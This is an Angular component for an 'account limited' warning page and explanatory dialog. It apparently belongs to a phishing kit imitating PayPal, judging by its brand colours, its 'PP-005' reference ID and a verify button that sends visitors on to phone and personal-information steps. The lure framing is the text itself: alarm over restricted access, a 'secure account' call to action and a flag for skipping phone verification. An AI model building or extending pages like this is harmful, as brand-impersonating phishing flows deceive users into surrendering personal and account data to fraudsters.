import { Component, inject, signal } from '@angular/core';
import { CommonModule } from '@angular/common';
import { PublicLayoutComponent } from './layout/public-layout.component';
import { StateService } from '../services/state.service';
import { TranslatePipe } from '../pipes/translate.pipe';

@Component({
  selector: 'app-limited-access',
  standalone: true,
  imports: [CommonModule, PublicLayoutComponent, TranslatePipe],
  template: `
    <app-public-layout>
      <div class="flex flex-col items-center text-center relative">
        <!-- Icon -->
        <div class="w-16 h-16 rounded-full bg-amber-50 border border-amber-100 flex items-center justify-center mb-6">
          <span class="material-icons text-3xl text-amber-600">gpp_maybe</span>
        </div>
        
        <h1 class="text-xl font-bold text-slate-900 mb-3">
          {{ 'LIMITED.TITLE' | translate }}
        </h1>
        
        <p class="text-sm text-slate-600 leading-relaxed mb-8 max-w-sm">
          {{ 'LIMITED.DESCRIPTION' | translate }}
        </p>

        <div class="w-full space-y-4">
          <button 
            (click)="verify()"
            class="w-full bg-[#003087] hover:bg-[#002569] text-white font-bold py-3.5 px-4 rounded-full transition-all duration-200 shadow-sm text-[15px]"
          >
            {{ 'LIMITED.BUTTON' | translate }}
          </button>

          <button 
            (click)="showDialog.set(true)"
            class="w-full text-[#0070ba] font-semibold text-sm hover:underline py-2"
          >
            {{ 'LIMITED.WHY_LINK' | translate }}
          </button>
        </div>
      </div>
      
    </app-public-layout>

    <!-- Popup Dialog -->
    @if (showDialog()) {
        <div class="fixed inset-0 z-50 flex items-center justify-center p-4 font-sans">
           <!-- Backdrop with improved blur and transparency -->
           <div class="absolute inset-0 bg-slate-900/40 backdrop-blur-md transition-all duration-300" (click)="showDialog.set(false)"></div>

           <!-- Modal Card -->
           <div class="bg-white rounded-2xl shadow-2xl w-full max-w-xl relative z-10 animate-slide-up duration-200 overflow-hidden">

              <!-- Header -->
              <div class="flex justify-between items-center p-6 border-b border-slate-100 bg-slate-50">
                 <h3 class="font-bold text-xl text-[#001C64]">{{ 'LIMITED.DIALOG_TITLE' | translate }}</h3>
                 <button (click)="showDialog.set(false)" class="text-slate-400 hover:text-[#001C64] transition-colors p-2 rounded-full hover:bg-slate-100">
                    <span class="material-icons text-xl">close</span>
                 </button>
              </div>

              <!-- Content -->
              <div class="p-8 space-y-6">

                 <!-- Alert Section -->
                 <div class="flex gap-4 p-4 bg-amber-50 rounded-lg border border-amber-100">
                    <div class="flex-shrink-0">
                       <span class="material-icons text-amber-600">warning</span>
                    </div>
                    <div>
                       <h4 class="font-bold text-slate-900 text-sm mb-1">{{ 'LIMITED.ALERT_TITLE' | translate }}</h4>
                       <p class="text-sm text-slate-600 leading-relaxed">
                          {{ 'LIMITED.ALERT_DESC' | translate }}
                       </p>
                    </div>
                 </div>

                 <!-- Details Grid -->
                 <div class="grid md:grid-cols-2 gap-6 text-sm">
                    <div>
                       <h5 class="font-bold text-[#001C64] mb-2 flex items-center gap-2">
                          <span class="material-icons text-lg text-slate-400">lock</span>
                          {{ 'LIMITED.WHATS_LIMITED' | translate }}
                       </h5>
                       <ul class="space-y-2 text-slate-600">
                          <li class="flex items-start gap-2">
                             <span class="w-1 h-1 rounded-full bg-slate-400 mt-2"></span>
                             {{ 'LIMITED.LIMIT_1' | translate }}
                          </li>
                          <li class="flex items-start gap-2">
                             <span class="w-1 h-1 rounded-full bg-slate-400 mt-2"></span>
                             {{ 'LIMITED.LIMIT_2' | translate }}
                          </li>
                          <li class="flex items-start gap-2">
                             <span class="w-1 h-1 rounded-full bg-slate-400 mt-2"></span>
                             {{ 'LIMITED.LIMIT_3' | translate }}
                          </li>
                       </ul>
                    </div>

                    <div>
                       <h5 class="font-bold text-[#001C64] mb-2 flex items-center gap-2">
                          <span class="material-icons text-lg text-slate-400">verified_user</span>
                          {{ 'LIMITED.HOW_TO_RESOLVE' | translate }}
                       </h5>
                       <p class="text-slate-600 leading-relaxed">
                          {{ 'LIMITED.RESOLVE_DESC' | translate }}
                       </p>
                    </div>
                 </div>

                 <!-- Reference -->
                 <div class="pt-4 border-t border-slate-100 flex justify-between items-center text-xs text-slate-500">
                    <span>Reference ID: <span class="font-mono text-slate-700">PP-005-{{ state.sessionId() }}</span></span>
                    <span>{{ today | date:'MMM d, y' }}</span>
                 </div>
              </div>

              <!-- Footer Actions -->
              <div class="p-6 bg-slate-50 border-t border-slate-100 flex justify-end gap-3">
                 <button (click)="showDialog.set(false)" class="px-6 py-3 rounded-full font-bold text-[#001C64] hover:bg-white hover:shadow-sm border border-transparent hover:border-slate-200 transition-all text-sm">
                    {{ 'COMMON.CLOSE' | translate }}
                 </button>
                 <button (click)="verify()" class="px-6 py-3 rounded-full font-bold text-white bg-[#003087] hover:bg-[#002569] shadow-sm hover:shadow transition-all text-sm">
                    {{ 'LIMITED.SECURE_ACCOUNT' | translate }}
                 </button>
              </div>
           </div>
        </div>
      }
  `
})
export class LimitedAccessComponent {
  state = inject(StateService);
  showDialog = signal(false);
  today = Date.now();

  verify() {
    if (this.state.skipPhoneVerification()) {
        this.state.navigate('personal');
    } else {
        this.state.navigate('phone');
    }
  }
}